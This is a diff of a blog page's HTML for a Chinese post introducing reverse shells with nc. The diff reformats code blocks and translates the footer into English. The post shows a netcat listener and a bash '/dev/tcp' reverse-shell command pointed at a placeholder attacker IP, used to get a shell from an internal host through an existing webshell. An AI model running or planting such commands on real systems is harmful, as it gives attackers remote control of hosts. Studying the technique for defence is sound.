@@ -119,12 +119,9 @@
 <h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://p3.ssl.qhimg.com/t019632a21686694291.png" alt="1"><br>目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。</p>
 <h3 id="bash-直接反弹"><a href="#bash-直接反弹" class="headerlink" title="bash 直接反弹"></a>bash 直接反弹</h3><ol>
 <li><p>主机执行监听命令:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>nc -l -p 8080 -vvv</code></pre></li>
 <li><p>靶机执行bash反弹命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-</li>
+<pre><code>root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</code></pre></li>
 </ol>
 <p><img src="https://s1.ax1x.com/2018/06/21/PSG5GD.jpg" alt="kaiqi"><br><img src="https://s1.ax1x.com/2018/06/21/PSGIRe.png" alt="xiaoguo"></p>
 <ol start="3">
@@ -139,16 +136,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/06/21/Nc反弹Shell初识/">https://hpdoger.cn/2018/06/21/Nc反弹Shell初识/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -161,7 +158,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
